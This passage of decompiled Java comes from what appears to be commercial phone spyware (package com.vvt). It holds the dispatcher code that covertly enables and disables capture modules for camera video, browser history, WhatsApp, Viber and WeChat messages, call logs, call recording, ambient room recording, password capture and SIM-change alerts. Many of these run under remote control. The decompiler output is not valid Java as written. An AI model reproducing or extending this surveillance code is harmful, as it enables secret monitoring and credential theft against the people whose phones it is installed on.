            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.F;
              ((com.vvt.capture.camera.video.a)localObject1).g();
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.F;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.F;
          ((com.vvt.capture.camera.video.a)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.camera.video.a locala = paramh.F;
      if (locala != null)
      {
        locala = paramh.F;
        locala.h();
        locala = paramh.F;
        locala.j();
        bool1 = false;
        locala = null;
        paramh.F = null;
      }
    }
  }
  
  private static void k(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.c.b localb;
    boolean bool;
    if (paramBoolean1)
    {
      localb = paramh.O;
      if (localb == null)
      {
        localb = new com/vvt/capture/c/b;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        localb.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.O = localb;
      }
      if (paramBoolean2)
      {
        paramh.O.a(paramb);
        localb = paramh.O;
        bool = localb.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localb = paramh.O;
          localb.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localb = paramh.O;
      localb.h();
      continue;
      localb = paramh.O;
      if (localb != null)
      {
        paramh.O.h();
        paramh.O.j();
        bool = false;
        localb = null;
        paramh.O = null;
      }
    }
  }
  
  public static void l(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_WALLPAPER;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          Object localObject3 = RemoteFunction.ENABLE_CAPTURE_WALLPAPER;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
          localObject1 = paramh.I;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/f/c;
            localObject3 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            Context localContext = paramh.a();
            q localq = paramh.h;
            ((com.vvt.capture.f.c)localObject1).<init>((String)localObject3, localRunningMode, localContext, localq);
            paramh.I = ((com.vvt.capture.f.c)localObject1);
          }
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          localObject3 = FeatureId.CAPTURE_WALLPAPER;
          boolean bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          if ((paramBoolean) && (bool1) && (bool2))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.I;
              ((com.vvt.capture.f.c)localObject1).a();
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.I;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.I;
          ((com.vvt.capture.f.c)localObject1).b();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.f.c localc = paramh.I;
      if (localc != null)
      {
        localc = paramh.I;
        localc.b();
        bool1 = false;
        localc = null;
        paramh.I = null;
      }
    }
  }
  
  private static void l(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.wa.a locala;
    boolean bool;
    if (paramBoolean1)
    {
      locala = paramh.B;
      if (locala == null)
      {
        locala = new com/vvt/capture/wa/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        Context localContext = paramh.a();
        com.vvt.n.a.c localc = paramh.V;
        locala.<init>(str, localq, localRunningMode, localContext, localc, paramb);
        paramh.B = locala;
      }
      if (paramBoolean2)
      {
        paramh.B.a(paramb);
        locala = paramh.B;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.B;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.B;
      locala.h();
      continue;
      locala = paramh.B;
      if (locala != null)
      {
        paramh.B.h();
        paramh.B.j();
        bool = false;
        locala = null;
        paramh.B = null;
      }
    }
  }
  
  public static void m(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_BROWSER_URL;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          Object localObject4 = RemoteFunction.ENABLE_CAPTURE_URL;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject4);
          localObject1 = paramh.J;
          RunningMode localRunningMode;
          Context localContext;
          q localq;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/browserurl/a;
            localObject4 = paramh.b();
            localRunningMode = paramh.d();
            localContext = paramh.a();
            localq = paramh.h;
            ((com.vvt.capture.browserurl.a)localObject1).<init>((String)localObject4, localRunningMode, localContext, localq);
            paramh.J = ((com.vvt.capture.browserurl.a)localObject1);
          }
          localObject1 = paramh.K;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/chrome/a;
            localObject4 = paramh.b();
            localRunningMode = paramh.d();
            localContext = paramh.a();
            localq = paramh.h;
            String str = paramh.c();
            com.vvt.n.a.c localc = paramh.V;
            ((com.vvt.capture.chrome.a)localObject1).<init>((String)localObject4, localRunningMode, localContext, localq, str, localc);
            paramh.K = ((com.vvt.capture.chrome.a)localObject1);
          }
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          localObject4 = FeatureId.CAPTURE_BROWSER_URL;
          boolean bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject4);
          if ((paramBoolean) && (bool1) && (bool2))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.J;
              ((com.vvt.capture.browserurl.a)localObject1).g();
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.K;
              ((com.vvt.capture.chrome.a)localObject1).g();
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.J;
          if (localObject1 != null)
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = paramh.J;
            ((com.vvt.capture.browserurl.a)localObject1).h();
          }
          localObject1 = paramh.K;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.K;
          ((com.vvt.capture.chrome.a)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      Object localObject3 = paramh.J;
      if (localObject3 != null)
      {
        localObject3 = paramh.J;
        ((com.vvt.capture.browserurl.a)localObject3).h();
        bool1 = false;
        localObject3 = null;
        paramh.J = null;
      }
      localObject3 = paramh.K;
      if (localObject3 != null)
      {
        localObject3 = paramh.K;
        ((com.vvt.capture.chrome.a)localObject3).h();
        bool1 = false;
        localObject3 = null;
        paramh.K = null;
      }
    }
  }
  
  private static void m(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.wa.voip.calllog.a locala;
    boolean bool;
    if (paramBoolean1)
    {
      locala = paramh.aq;
      if (locala == null)
      {
        locala = new com/vvt/capture/wa/voip/calllog/a;
        String str1 = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        Context localContext = paramh.a();
        com.vvt.n.a.c localc = paramh.V;
        String str2 = paramb.f();
        locala.<init>(str1, localq, localRunningMode, localContext, localc, str2);
        paramh.aq = locala;
      }
      if (paramBoolean2)
      {
        locala = paramh.aq;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.aq;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.aq;
      locala.h();
      continue;
      locala = paramh.aq;
      if (locala != null)
      {
        paramh.aq.h();
        paramh.aq.j();
        bool = false;
        locala = null;
        paramh.aq = null;
      }
    }
  }
  
  public static void n(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool1 = true;
    Context localContext = null;
    for (;;)
    {
      synchronized (i.class)
      {
        boolean bool2 = a;
        if (bool2) {}
        Object localObject1 = FeatureId.CAPTURE_APPLICATION;
        bool2 = paramList.contains(localObject1);
        if (bool2)
        {
          boolean bool3 = paramPrefEventsCapture.isCaptureEnabled();
          localObject1 = FeatureId.CAPTURE_APPLICATION;
          boolean bool4 = paramPrefEventsCapture.isCapture((FeatureId)localObject1);
          localObject1 = paramh.d();
          RunningMode localRunningMode = RunningMode.FULL;
          if (localObject1 != localRunningMode)
          {
            bool2 = bool1;
            if ((paramBoolean) && (bool3) && (bool4) && (bool2))
            {
              if (!bool1) {
                continue;
              }
              bool1 = a;
              if (bool1) {}
              localApplicationProfileManagerImpl1 = paramh.M;
              localContext = paramh.a();
              localApplicationProfileManagerImpl1.a(localContext);
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool2 = false;
            localObject1 = null;
            continue;
          }
          bool1 = false;
          ApplicationProfileManagerImpl localApplicationProfileManagerImpl1 = null;
          continue;
          localApplicationProfileManagerImpl1 = paramh.M;
          localContext = paramh.a();
          localApplicationProfileManagerImpl1.b(localContext);
        }
      }
      bool1 = a;
      if (bool1) {}
      ApplicationProfileManagerImpl localApplicationProfileManagerImpl2 = paramh.M;
      if (localApplicationProfileManagerImpl2 != null)
      {
        localApplicationProfileManagerImpl2 = paramh.M;
        localContext = paramh.a();
        localApplicationProfileManagerImpl2.b(localContext);
      }
    }
  }
  
  private static void n(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.viber.b localb;
    boolean bool;
    if (paramBoolean1)
    {
      localb = paramh.T;
      if (localb == null)
      {
        localb = new com/vvt/capture/viber/b;
        Context localContext = paramh.a();
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        localb.<init>(localContext, str, localq, localRunningMode, localc, paramb);
        paramh.T = localb;
      }
      if (paramBoolean2)
      {
        paramh.T.a(paramb);
        localb = paramh.T;
        bool = localb.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localb = paramh.T;
          localb.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localb = paramh.T;
      localb.h();
      continue;
      localb = paramh.T;
      if (localb != null)
      {
        paramh.T.h();
        paramh.T.j();
        bool = false;
        localb = null;
        paramh.T = null;
      }
    }
  }
  
  public static void o(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_CALENDAR;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          RemoteFunction localRemoteFunction = RemoteFunction.ENABLE_CAPTURE_CALENDAR;
          ((RemoteControlImpl)localObject1).registerFunction(localRemoteFunction);
          localObject1 = FeatureId.CAPTURE_CALENDAR;
          bool1 = paramPrefEventsCapture.isCapture((FeatureId)localObject1);
          if ((paramBoolean) && (bool1))
          {
            bool1 = true;
            boolean bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.N;
              ((com.vvt.capture.calendar.a)localObject1).a();
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.N;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.N;
          ((com.vvt.capture.calendar.a)localObject1).b();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.calendar.a locala = paramh.N;
      if (locala != null)
      {
        locala = paramh.N;
        locala.b();
      }
    }
  }
  
  private static void o(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.c.b.a.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.an;
      if (locala == null)
      {
        locala = new com/vvt/capture/c/b/a/a;
        Context localContext = paramh.a();
        String str1 = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        String str2 = paramb.f();
        locala.<init>(localContext, str1, localq, localRunningMode, localc, str2);
        paramh.an = locala;
      }
      if (paramBoolean2)
      {
        locala = paramh.an;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.an;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.an;
      locala.h();
      continue;
      locala = paramh.an;
      if (locala != null)
      {
        paramh.an.h();
        paramh.an.j();
        bool = false;
        locala = null;
        paramh.an = null;
      }
    }
  }
  
  public static void p(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    Object localObject1 = null;
    for (;;)
    {
      synchronized (i.class)
      {
        FeatureId localFeatureId = FeatureId.CAPTURE_CALL_RECORDING;
        boolean bool3 = paramList.contains(localFeatureId);
        boolean bool4 = a;
        if ((!bool4) || (bool3))
        {
          bool3 = paramPrefEventsCapture.isCaptureEnabled();
          bool4 = a;
          if (bool4) {}
          Object localObject2 = FeatureId.CAPTURE_CALL_RECORDING;
          bool4 = paramPrefEventsCapture.isCapture((FeatureId)localObject2);
          boolean bool5 = a;
          if (bool5) {}
          Object localObject3 = paramh.a();
          bool5 = com.vvt.aa.b.a((Context)localObject3);
          boolean bool6 = a;
          if ((!bool6) || ((paramBoolean) && (bool3) && (bool4) && (bool5)))
          {
            bool3 = bool1;
            bool4 = a;
            if (bool4) {}
            localObject2 = paramh.d();
            localObject3 = RunningMode.FULL;
            if (localObject2 == localObject3)
            {
              localObject1 = paramh.R;
              if (localObject1 == null)
              {
                localObject1 = paramh.a();
                localObject2 = paramh.b();
                localObject3 = paramh.d();
                com.vvt.preference.b localb = paramh.n;
                q localq = paramh.h;
                localObject1 = com.vvt.capture.a.b.a((Context)localObject1, (String)localObject2, (RunningMode)localObject3, localb, localq);
                paramh.R = ((com.vvt.capture.a.a)localObject1);
              }
              if (!bool3) {
                continue;
              }
              if (bool1)
              {
                bool1 = a;
                if (bool1) {}
                localObject4 = paramh.b;
                if (localObject4 != null)
                {
                  localObject4 = paramh.b;
                  bool2 = true;
                  ((com.vvt.callmanager.ref.e)localObject4).c(bool2);
                }
              }
              bool1 = a;
              if (bool1) {}
              localObject4 = paramh.R;
              ((com.vvt.capture.a.a)localObject4).a();
              localObject4 = paramh.Q;
              localObject1 = paramh.R;
              ((com.vvt.callhandler.c)localObject4).a((com.vvt.capture.a.a)localObject1);
              localObject4 = paramh.Q;
              localObject1 = paramh.S;
              ((com.vvt.callhandler.c)localObject4).a((com.vvt.a.a)localObject1);
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool3 = false;
            localFeatureId = null;
            continue;
          }
          bool1 = false;
          Object localObject4 = null;
          continue;
          localObject1 = paramh.Q;
          bool3 = false;
          localFeatureId = null;
          ((com.vvt.callhandler.c)localObject1).a(null);
          if (bool1)
          {
            localObject4 = paramh.b;
            if (localObject4 != null)
            {
              bool1 = a;
              if (bool1) {}
              localObject4 = paramh.b;
              bool2 = false;
              localObject1 = null;
              ((com.vvt.callmanager.ref.e)localObject4).c(false);
            }
            bool1 = a;
            if (bool1) {}
            localObject4 = paramh.R;
            ((com.vvt.capture.a.a)localObject4).b();
          }
          bool1 = false;
          localObject4 = null;
          paramh.R = null;
        }
      }
      bool1 = a;
      if (bool1) {}
      Object localObject6 = paramh.b;
      if (localObject6 != null)
      {
        localObject6 = paramh.b;
        bool2 = false;
        localObject1 = null;
        ((com.vvt.callmanager.ref.e)localObject6).c(false);
      }
      localObject6 = paramh.Q;
      bool2 = false;
      localObject1 = null;
      ((com.vvt.callhandler.c)localObject6).a(null);
      bool1 = false;
      localObject6 = null;
      paramh.R = null;
    }
  }
  
  private static void p(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.viber.a.a.a locala;
    boolean bool;
    if (paramBoolean1)
    {
      locala = paramh.am;
      if (locala == null)
      {
        locala = new com/vvt/capture/viber/a/a/a;
        Context localContext = paramh.a();
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        locala.<init>(localContext, str, localq, localRunningMode, localc, paramb);
        paramh.am = locala;
      }
      if (paramBoolean2)
      {
        locala = paramh.am;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.am;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.am;
      locala.h();
      continue;
      locala = paramh.am;
      if (locala != null)
      {
        paramh.am.h();
        paramh.am.j();
        bool = false;
        locala = null;
        paramh.am = null;
      }
    }
  }
  
  public static void q(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool1 = true;
    boolean bool2;
    synchronized (i.class)
    {
      bool2 = a;
      if (bool2) {}
      for (;;)
      {
        try
        {
          localObject1 = paramh.d();
          Object localObject4 = RunningMode.LIMITED_1;
          if (localObject1 != localObject4)
          {
            localObject1 = paramh.d();
            localObject4 = RunningMode.FULL;
            if (localObject1 != localObject4) {
              continue;
            }
          }
          localObject1 = FeatureId.CAPTURE_PASSWORD;
          bool2 = paramList.contains(localObject1);
          if (!bool2) {
            continue;
          }
          bool2 = bool1;
          boolean bool3 = a;
          if ((bool3) && (!bool2)) {
            continue;
          }
          localObject1 = paramh.q;
          localObject4 = RemoteFunction.ENABLE_CAPTURE_PASSWORD;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject4);
          localObject1 = paramh.W;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/d/b;
            localObject4 = paramh.b();
            ((com.vvt.capture.d.b)localObject1).<init>((String)localObject4);
            paramh.W = ((com.vvt.capture.d.b)localObject1);
            localObject1 = paramh.W;
            localObject4 = paramh.g;
            ((com.vvt.capture.d.b)localObject1).a((com.vvt.datadeliverymanager.b)localObject4);
            localObject1 = paramh.W;
            ((com.vvt.capture.d.b)localObject1).b();
            localObject1 = paramh.W;
            localObject4 = paramh.ak;
            ((com.vvt.capture.d.b)localObject1).a((com.vvt.playstore.autoupdateapps.a)localObject4);
          }
          localObject1 = paramh.X;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/d/a/a;
            localObject4 = paramh.d();
            localObject5 = paramh.b();
            com.vvt.datadeliverymanager.b localb = paramh.g;
            com.vvt.n.a.c localc = paramh.V;
            Context localContext = paramh.a();
            String str = paramh.c();
            ((com.vvt.capture.d.a.a)localObject1).<init>((RunningMode)localObject4, (String)localObject5, localb, localc, localContext, str);
            paramh.X = ((com.vvt.capture.d.a.a)localObject1);
            localObject1 = paramh.X;
            ((com.vvt.capture.d.a.a)localObject1).a();
          }
          localObject1 = paramh.Y;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/d/a;
            localObject4 = paramh.d();
            localObject5 = paramh.a();
            ((com.vvt.capture.d.a)localObject1).<init>((RunningMode)localObject4, (Context)localObject5);
            paramh.Y = ((com.vvt.capture.d.a)localObject1);
          }
          localObject1 = paramh.W;
          bool2 = ((com.vvt.capture.d.b)localObject1).a();
          bool3 = paramPrefEventsCapture.isCaptureEnabled();
          Object localObject5 = FeatureId.CAPTURE_PASSWORD;
          boolean bool4 = paramPrefEventsCapture.isCapture((FeatureId)localObject5);
          if ((!paramBoolean) || (!bool3) || (!bool4) || (!bool2)) {
            continue;
          }
          bool2 = bool1;
          bool3 = a;
          if ((bool3) && (!bool2)) {
            continue;
          }
          localObject1 = paramh.W;
          localObject4 = paramh.h;
          ((com.vvt.capture.d.b)localObject1).a((com.vvt.base.a)localObject4);
          bool2 = a;
          if (bool2) {}
          localObject1 = paramh.W;
          ((com.vvt.capture.d.b)localObject1).d();
          bool2 = a;
          if (bool2) {}
          localObject1 = paramh.X;
          bool2 = ((com.vvt.capture.d.a.a)localObject1).b();
          if (bool2)
          {
            localObject1 = paramh.X;
            ((com.vvt.capture.d.a.a)localObject1).c();
          }
        }
        catch (Exception localException)
        {
          Object localObject1;
          bool2 = c;
          if (!bool2) {
            continue;
          }
          continue;
          bool2 = a;
          if (!bool2) {
            continue;
          }
          Object localObject2 = paramh.W;
          if (localObject2 == null) {
            continue;
          }
          localObject2 = paramh.W;
          ((com.vvt.capture.d.b)localObject2).e();
          localObject2 = paramh.W;
          ((com.vvt.capture.d.b)localObject2).c();
          bool2 = false;
          localObject2 = null;
          paramh.W = null;
          localObject2 = paramh.X;
          if (localObject2 == null) {
            continue;
          }
          localObject2 = paramh.X;
          ((com.vvt.capture.d.a.a)localObject2).d();
          continue;
        }
        bool2 = a;
        if (bool2) {}
        return;
        bool2 = false;
        localObject1 = null;
        continue;
        bool2 = false;
        localObject1 = null;
      }
      bool2 = a;
      if (bool2) {}
      localObject1 = paramh.W;
      ((com.vvt.capture.d.b)localObject1).e();
      bool2 = a;
      if (bool2) {}
      localObject1 = paramh.X;
      ((com.vvt.capture.d.a.a)localObject1).d();
    }
  }
  
  private static void q(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.b.b localb;
    boolean bool;
    if (paramBoolean1)
    {
      localb = paramh.L;
      if (localb == null)
      {
        localb = new com/vvt/capture/b/b;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        localb.<init>(str, localq, localRunningMode, localc, paramb);
        paramh.L = localb;
      }
      if (paramBoolean2)
      {
        paramh.L.a(paramb);
        localb = paramh.L;
        bool = localb.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localb = paramh.L;
          localb.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localb = paramh.L;
      localb.h();
      continue;
      localb = paramh.L;
      if (localb != null)
      {
        paramh.L.h();
        paramh.L.j();
        bool = false;
        localb = null;
        paramh.L = null;
      }
    }
  }
  
  private static void r(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = paramh.d();
    RunningMode localRunningMode = RunningMode.LIMITED_1;
    if (localObject != localRunningMode)
    {
      localObject = paramh.d();
      localRunningMode = RunningMode.FULL;
      if (localObject != localRunningMode) {}
    }
    else
    {
      localObject = paramh.ak;
      bool = ((com.vvt.playstore.autoupdateapps.b)localObject).c();
      if ((bool) && (paramBoolean))
      {
        localObject = paramh.ak;
        ((com.vvt.playstore.autoupdateapps.b)localObject).d();
        bool = a;
        if (!bool) {}
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      localObject = paramh.ak;
      localRunningMode = null;
      ((com.vvt.playstore.autoupdateapps.b)localObject).a(false);
      continue;
      bool = a;
      if (!bool) {}
    }
  }
  
  private static void r(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.b.c.a.a locala;
    boolean bool;
    if (paramBoolean1)
    {
      locala = paramh.ap;
      if (locala == null)
      {
        locala = new com/vvt/capture/b/c/a/a;
        String str1 = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        String str2 = paramb.f();
        locala.<init>(str1, localq, localRunningMode, localc, str2);
        paramh.ap = locala;
      }
      if (paramBoolean2)
      {
        locala = paramh.ap;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ap;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ap;
      locala.h();
      continue;
      locala = paramh.ap;
      if (locala != null)
      {
        paramh.ap.h();
        paramh.ap.j();
        bool = false;
        locala = null;
        paramh.ap = null;
      }
    }
  }
  
  private static void s(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.SIM_CHANGE_NOTIFICATION;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.A;
          String str1;
          if (localObject1 == null)
          {
            localObject1 = paramh.k;
            localObject1 = ((com.vvt.license.b)localObject1).a();
            if (localObject1 == null) {
              continue;
            }
            str1 = ((LicenseInfo)localObject1).getActivationCode();
            com.vvt.preference.b localb = paramh.n;
            localObject1 = FeatureId.HOME_NUMBER;
            boolean bool2 = paramList.contains(localObject1);
            localObject1 = FeatureId.MONITOR_NUMBER;
            boolean bool3 = paramList.contains(localObject1);
            bool1 = a;
            if (bool1) {}
            bool1 = a;
            if (bool1) {}
            localObject1 = new com/vvt/capture/simchange/SimChangeCapture;
            Object localObject3 = paramh.a();
            String str2 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            com.vvt.phoneinfo.b localb1 = paramh.l;
            ProductInfoImpl localProductInfoImpl = paramh.o;
            q localq = paramh.h;
            com.vvt.ae.f localf = paramh.c;
            ((SimChangeCapture)localObject1).<init>((Context)localObject3, str2, localRunningMode, localb1, localProductInfoImpl, localq, str1, bool2, bool3, localf);
            paramh.A = ((SimChangeCapture)localObject1);
            if (bool2)
            {
              localObject1 = FxPreferenceType.HOME_NUMBER;
              localObject1 = a(localb, (FxPreferenceType)localObject1);
              localObject3 = paramh.A;
              ((SimChangeCapture)localObject3).a((com.vvt.capture.simchange.d)localObject1);
            }
            if (bool3)
            {
              localObject1 = FxPreferenceType.MONITOR_NUMBER;
              localObject1 = a(localb, (FxPreferenceType)localObject1);
              localObject3 = paramh.A;
              ((SimChangeCapture)localObject3).b((com.vvt.capture.simchange.d)localObject1);
            }
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.a();
          bool1 = com.vvt.aa.b.b((Context)localObject1);
          boolean bool4 = a;
          if ((!bool4) || ((paramBoolean) && (bool1)))
          {
            bool1 = a;
            if (bool1) {}
            localObject1 = paramh.A;
            ((SimChangeCapture)localObject1).a();
            bool1 = a;
            if (bool1) {}
            return;
            str1 = "";
            continue;
          }
          localObject1 = paramh.A;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.A;
          ((SimChangeCapture)localObject1).c();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      SimChangeCapture localSimChangeCapture = paramh.A;
      if (localSimChangeCapture != null)
      {
        localSimChangeCapture = paramh.A;
        localSimChangeCapture.c();
        bool1 = false;
        localSimChangeCapture = null;
        paramh.A = null;
      }
    }
  }
  
  private static void s(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.wechat.a locala;
    boolean bool;
    if (paramBoolean1)
    {
      locala = paramh.U;
      if (locala == null)
      {
        locala = new com/vvt/capture/wechat/a;
        String str1 = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        String str2 = paramh.l.d();
        locala.<init>(str1, localq, localRunningMode, localc, str2, paramb);
        paramh.U = locala;
      }
      if (paramBoolean2)
      {
        locala = paramh.U;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.U;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.U;
      locala.h();
      continue;
      locala = paramh.U;
      if (locala != null)
      {
        paramh.U.h();
        paramh.U.j();
        bool = false;
        locala = null;
        paramh.U = null;
      }
    }
  }
  
  private static void t(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    synchronized (i.class)
    {
      boolean bool = a;
      if (bool) {}
      Object localObject1 = FeatureId.AMBIENT_RECORDING;
      bool = paramList.contains(localObject1);
      if (bool)
      {
        bool = a;
        if (bool) {}
        localObject1 = paramh.S;
        if (localObject1 == null)
        {
          localObject1 = paramh.d();
          Object localObject3 = paramh.h;
          Context localContext = paramh.a();
          localObject1 = com.vvt.a.b.a((RunningMode)localObject1, (com.vvt.base.a)localObject3, localContext);
          paramh.S = ((com.vvt.a.a)localObject1);
          localObject1 = paramh.Q;
          localObject3 = paramh.S;
          ((com.vvt.callhandler.c)localObject1).a((com.vvt.a.a)localObject3);
          bool = a;
          if (!bool) {}
        }
      }
      do
      {
        bool = a;
        if (bool) {}
        return;
        bool = a;
        if (bool) {}
        localObject1 = paramh.S;
      } while (localObject1 == null);
      bool = false;
      localObject1 = null;
      paramh.S = null;
    }
  }
  
